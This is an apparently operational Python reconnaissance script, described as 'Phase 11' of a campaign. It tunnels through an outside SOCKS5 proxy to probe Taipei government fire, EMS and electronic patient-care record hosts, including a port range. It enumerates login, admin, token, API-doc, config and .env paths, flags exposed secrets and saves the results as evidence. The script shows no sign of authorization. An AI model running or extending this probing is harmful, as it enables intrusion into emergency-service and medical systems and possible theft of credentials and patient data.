#!/usr/bin/env python3
"""
Phase 11: Probe FSM/EPCR hosts via the proxy tunnel.
The proxy at 202.160.76.155:11084 was used successfully in prior recon.
Target hosts that returned 'Network unreachable':
  - fsm.119.gov.taipei
  - epcr.tpf.gov.tw (ports 4000-4008)
  - mer2.tpf.gov.tw
  - taipeiciiis.119.gov.taipei
  - taipeiciiis-dashboard.119.gov.taipei (403 even via direct)
"""
import requests, json, time, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Try the proxy tunnel
proxies = {
    "http": "socks5h://202.160.76.155:11084",
    "https": "socks5h://202.160.76.155:11084",
}

s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,application/json,*/*",
})

# Hosts to probe via proxy
hosts_to_probe = [
    "https://fsm.119.gov.taipei",
    "https://taipeiciiis.119.gov.taipei",
    "https://taipeiciiis-dashboard.119.gov.taipei",
    "https://taipeiciiis-dt.119.gov.taipei",
    "https://epcr.tpf.gov.tw",
    "https://mer2.tpf.gov.tw",
    "https://119api.tpf.gov.tw",
    "https://119appapi.tpf.gov.tw",
    "https://119appcaseapi.tpf.gov.tw",
    "https://119epcrapi.tpf.gov.tw",
]

# Also probe EPA 119-related ports
epcr_ports = [
    "https://epcr.tpf.gov.tw:4000",
    "https://epcr.tpf.gov.tw:4001",
    "https://epcr.tpf.gov.tw:4002",
    "https://epcr.tpf.gov.tw:4003",
    "https://epcr.tpf.gov.tw:4004",
    "https://epcr.tpf.gov.tw:4005",
    "https://epcr.tpf.gov.tw:4006",
    "https://epcr.tpf.gov.tw:4007",
    "https://epcr.tpf.gov.tw:4008",
]

login_paths = [
    "/", "/index", "/login", "/admin/login", "/api/login", "/auth/login",
    "/citizen/auth/genToken", "/auth/genToken", "/auth/fetchServerData",
    "/api/getUserToken", "/user/login", "/oauth/token", "/sso/login",
    "/cas/login", "/admin", "/console", "/dashboard",
    "/swagger-ui.html", "/api-docs", "/config", "/config.json",
    "/robots.txt", "/.env", "/.well-known/",
    "/rtc/account.php", "/rtc/", "/account.php",
    "/epcr", "/mer", "/merBridge",
    "/vitalsign", "/vitalsignvideoserver",
    "/Socket.io", "/socket.io/",
]

print("=" * 60)
print("PROXY-BASED PROBE OF FSM/EPCR HOSTS")
print("Proxy: socks5h://202.160.76.155:11084")
print("=" * 60)

results = {}

# First check if proxy is working
print("\n[*] Testing proxy connectivity...")
try:
    r = requests.get("https://www.google.com", proxies=proxies, timeout=10, verify=False)
    print(f"  [+] Proxy works! Google returned {r.status_code}")
except Exception as e:
    print(f"  [-] Proxy failed: {e}")
    print("  [!] Falling back to direct access...")
    proxies = None

for base in hosts_to_probe + epcr_ports:
    print(f"\n[*] Probing: {base}")
    host_results = []
    
    try:
        r = s.get(base, timeout=10, verify=False, allow_redirects=False,
                  proxies=proxies if proxies else None)
        status = r.status_code
        length = len(r.text)
        server = r.headers.get("Server", "").strip()[:60]
        location = r.headers.get("Location", "").strip()[:150]
        
        print(f"  [{status}] {base} ({length}b) [{server[:40]}]")
        if r.text:
            body_preview = r.text[:200].replace('\n', ' ').replace('\r', '')
            print(f"    Body: {body_preview}")
            host_results.append({
                "url": base, "status": status, "length": length,
                "server": server, "location": location,
                "body_preview": body_preview
            })
        
        # Only probe sub-paths if host is alive (not 502, not connection error)
        if status < 500:
            for path in login_paths:
                url = f"{base}{path}"
                try:
                    r = s.get(url, timeout=5, verify=False, allow_redirects=False,
                              proxies=proxies if proxies else None)
                    if r.status_code in [200, 302, 301, 401, 403]:
                        if r.status_code == 200 and len(r.text) < 20:
                            continue  # Skip tiny default nginx pages on most hosts
                        loc = r.headers.get("Location", "").strip()[:100]
                        svr = r.headers.get("Server", "").strip()[:40]
                        marker = ""
                        if r.status_code == 200:
                            marker = "<-- LIVE"
                            if "env" in path.lower() and r.text:
                                marker = "<-- .env EXPOSED!"
                        elif r.status_code in [301, 302]:
                            marker = f"-> {loc}"
                        elif r.status_code in [401, 403]:
                            marker = f"(auth:{r.status_code})"
                        print(f"    [{r.status_code}] {path} ({len(r.text)}b) [{svr}] {marker}")
                        if r.text and r.status_code == 200:
                            print(f"      Body: {r.text[:150]}")
                        host_results.append({
                            "path": path, "url": url,
                            "status": r.status_code, "length": len(r.text),
                            "server": svr, "location": loc
                        })
                except:
                    pass
    except Exception as e:
        err = str(e)
        if "Connection" in err or "refused" in err or "timed out" in err:
            print(f"  [--] {base} - unreachable ({err[:60]})")
            host_results.append({"url": base, "error": "unreachable", "detail": err[:100]})
        else:
            print(f"  [ERR] {base}: {err[:80]}")
            host_results.append({"url": base, "error": str(type(e).__name__), "detail": err[:100]})
    
    results[base] = host_results
    time.sleep(0.1)

print("\n" + "=" * 60)
print("SUMMARY: Live login/admin endpoints found")
print("=" * 60)
for base, findings in results.items():
    live = [f for f in findings if f.get("status") in [200, 301, 302, 401, 403]]
    if live:
        print(f"\n{base}:")
        for f in live:
            path = f.get("path", "/")
            st = f.get("status", "?")
            ln = f.get("length", 0)
            print(f"  [{st}] {path} ({ln}b)")

output_file = f"/mnt/c/Users/Administrator/desktop/JySecAI/tpe119_evidence/carpet_proxy_probe_{int(time.time())}.json"
with open(output_file, "w") as f:
    json.dump(results, f, indent=2, default=str, ensure_ascii=False)
print(f"\n[*] Results saved to: {output_file}")
